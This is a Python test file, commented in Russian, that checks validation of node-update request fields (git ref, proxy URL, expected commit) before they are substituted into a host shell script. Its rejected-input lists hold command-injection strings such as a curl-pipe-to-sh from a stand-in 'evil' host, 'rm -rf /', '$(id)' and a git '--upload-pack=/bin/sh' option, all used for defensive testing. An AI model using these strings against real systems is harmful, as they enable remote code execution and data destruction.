"""Tests for the update-request validation in app.routers.system.

Runnable with plain stdlib:  python -m unittest discover -s node/tests

Поля подставляются в текст shell-скрипта, который апдейтер исполняет на
хосте через nsenter, поэтому у теста две обязанности сразу: не пропустить
метасимвол и не отсечь то, чем реально пользуются. Второе не менее важно —
слишком узкий паттерн отрезал бы ноду от обновлений, включая откат по SHA.
expected_commit ещё и сравнивается с `git rev-parse HEAD` клона с зеркала —
годится только полный SHA строчными.
"""

import asyncio
import os
import sys
import unittest
from unittest.mock import AsyncMock, MagicMock, patch

from pydantic import ValidationError

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.routers import system  # noqa: E402
from app.routers.system import UpdateRequest  # noqa: E402


ACCEPTED_REFS = [
    "main",                                      # стабильный канал
    "dev",                                       # dev-канал
    "10.14.0",                                   # тег версии — путь отката
    "v10.14.0",
    "1a2b3c4",                                   # короткий SHA
    "0123456789abcdef0123456789abcdef01234567",  # полный SHA
    "release/10.14",                             # ветка со слешем
    "fix_node-update.v2",
]

REJECTED_REFS = [
    "main; curl http://evil/x | sh",
    "main && reboot",
    "$(id)",
    "`id`",
    "main\nrm -rf /",
    "main | tee /etc/passwd",
    "main 'quoted'",
    'main "quoted"',
    "--upload-pack=/bin/sh",   # ведущий дефис git принял бы за опцию
    "main*",                   # глоб раскрылся бы в неквотированной подстановке
    "main$HOME",
    "",
    "x" * 101,                 # длиннее max_length
]

ACCEPTED_PROXIES = [
    "http://127.0.0.1:3128",
    "https://proxy.example.com:8080",
    "socks5://10.0.0.1:1080",
    "socks5h://10.0.0.1:1080",
    "http://user:pass@proxy.example.com:3128",
    "http://127.0.0.1:3128/",
]

REJECTED_PROXIES = [
    "http://127.0.0.1:3128; reboot",
    "http://127.0.0.1:3128 && id",
    "http://$(id)",
    "http://127.0.0.1:3128\nrm -rf /",
    "http://proxy with space:3128",
    "127.0.0.1:3128",          # без схемы — не URL
    "http://",                 # схема без хоста
    "",
]


class GitRefValidationTests(unittest.TestCase):

    def test_accepts_everything_the_panel_and_rollback_actually_send(self):
        for ref in ACCEPTED_REFS:
            with self.subTest(ref=ref):
                self.assertEqual(UpdateRequest(target_version=ref).target_version, ref)

    def test_rejects_shell_metacharacters_and_option_lookalikes(self):
        for ref in REJECTED_REFS:
            with self.subTest(ref=ref):
                with self.assertRaises(ValidationError):
                    UpdateRequest(target_version=ref)

    def test_omitted_ref_stays_none(self):
        self.assertIsNone(UpdateRequest().target_version)
        self.assertIsNone(UpdateRequest(target_version=None).target_version)


class ProxyValidationTests(unittest.TestCase):

    def test_accepts_usual_proxy_urls(self):
        for proxy in ACCEPTED_PROXIES:
            with self.subTest(proxy=proxy):
                self.assertEqual(UpdateRequest(proxy=proxy).proxy, proxy)

    def test_rejects_shell_metacharacters(self):
        for proxy in REJECTED_PROXIES:
            with self.subTest(proxy=proxy):
                with self.assertRaises(ValidationError):
                    UpdateRequest(proxy=proxy)

    def test_omitted_proxy_stays_none(self):
        self.assertIsNone(UpdateRequest().proxy)


FULL_SHA = "0123456789abcdef0123456789abcdef01234567"

REJECTED_COMMITS = [
    "0123456",                       # короткий SHA сверке с rev-parse HEAD не годится
    FULL_SHA.upper(),                # rev-parse печатает строчными — сравнение строгое
    FULL_SHA + "8",
    FULL_SHA[:-1] + "g",
    FULL_SHA[:-1] + ";",
    f"{FULL_SHA}\nreboot",
    "main",
    "",
]


class ExpectedCommitValidationTests(unittest.TestCase):

    def test_accepts_full_lowercase_sha(self):
        self.assertEqual(UpdateRequest(expected_commit=FULL_SHA).expected_commit, FULL_SHA)

    def test_rejects_anything_but_full_sha(self):
        for commit in REJECTED_COMMITS:
            with self.subTest(commit=commit):
                with self.assertRaises(ValidationError):
                    UpdateRequest(expected_commit=commit)

    def test_old_panel_without_field_is_accepted(self):
        self.assertIsNone(UpdateRequest(target_version="main").expected_commit)

    def test_unknown_fields_from_newer_panel_are_ignored(self):
        # Так же старая нода (та же модель без expected_commit) принимает запрос новой панели
        request = UpdateRequest.model_validate({"target_version": "main", "field_from_future_panel": "x"})
        self.assertEqual(request.target_version, "main")


class TriggerUpdateWiringTests(unittest.IsolatedAsyncioTestCase):

    async def trigger(self, payload):
        started = AsyncMock()
        state = MagicMock()
        with patch.object(system, "run_update_in_container", started), \
                patch.object(system, "_inspect_updater", AsyncMock(return_value=None)), \
                patch.object(system, "_update_state", state), \
                patch.object(system, "_update_task", None):
            await system.trigger_update(payload)
            await asyncio.sleep(0)
        return started.call_args

    async def test_expected_commit_reaches_updater(self):
        call = await self.trigger(UpdateRequest(target_version="dev", expected_commit=FULL_SHA))
        self.assertEqual(call.kwargs["expected_commit"], FULL_SHA)

    async def test_request_without_commit_starts_updater_without_mirror_check(self):
        call = await self.trigger(UpdateRequest(target_version="dev"))
        self.assertIsNone(call.kwargs["expected_commit"])


if __name__ == "__main__":
    unittest.main()
